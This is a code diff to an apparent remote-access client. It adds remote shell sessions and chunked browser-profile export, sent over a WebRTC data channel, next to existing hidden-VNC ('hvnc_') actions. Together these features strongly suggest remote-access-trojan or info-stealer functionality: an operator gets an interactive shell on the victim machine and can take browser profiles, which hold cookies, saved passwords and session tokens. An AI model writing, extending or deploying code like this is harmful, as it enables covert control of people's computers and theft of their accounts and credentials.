@@ -870,6 +870,84 @@ class WebRTCClient:
                 )
             return
 
+        # Remote Shell Actions
+        if action.startswith("shell_"):
+            shell_action = action[6:]  # Remove "shell_" prefix
+            try:
+                from remote_client.shell import handle_shell_action
+                
+                # Create output callback for interactive sessions
+                def shell_output_callback(session_id: str, output: str):
+                    try:
+                        self._send_payload(
+                            data_channel,
+                            {
+                                "action": "shell_output",
+                                "session_id": session_id,
+                                "output": output,
+                            },
+                        )
+                    except Exception as e:
+                        logger.debug("Failed to send shell output: %s", e)
+                
+                response = handle_shell_action(shell_action, payload, shell_output_callback)
+                self._send_payload(data_channel, response)
+            except ImportError as exc:
+                logger.warning("Shell module import failed: %s", exc)
+                self._send_error(
+                    data_channel,
+                    "shell_unavailable",
+                    "Remote shell module not available.",
+                )
+            except Exception as exc:
+                logger.warning("Shell action %s failed: %s", action, exc)
+                self._send_payload(
+                    data_channel,
+                    {
+                        "action": action,
+                        "success": False,
+                        "error": str(exc),
+                    },
+                )
+            return
+
+        # Browser Profile Export Actions
+        if action.startswith("profile_"):
+            profile_action = action[8:]  # Remove "profile_" prefix
+            try:
+                from remote_client.browser_profile import get_profile_exporter
+                exporter = get_profile_exporter()
+                response = exporter.handle_action(profile_action, payload)
+                
+                # For large profile exports, send in chunks
+                if response.get("success") and response.get("data"):
+                    data = response.pop("data")
+                    # Send metadata first
+                    self._send_payload(data_channel, response)
+                    # Then send data in chunks
+                    await self._send_chunked_payload(data_channel, data, "profile")
+                else:
+                    self._send_payload(data_channel, response)
+                    
+            except ImportError as exc:
+                logger.warning("Profile module import failed: %s", exc)
+                self._send_error(
+                    data_channel,
+                    "profile_unavailable",
+                    "Browser profile export not available.",
+                )
+            except Exception as exc:
+                logger.warning("Profile action %s failed: %s", action, exc)
+                self._send_payload(
+                    data_channel,
+                    {
+                        "action": action,
+                        "success": False,
+                        "error": str(exc),
+                    },
+                )
+            return
+
         # HVNC Actions
         if action.startswith("hvnc_"):
             hvnc_action = action[5:]  # Remove "hvnc_" prefix
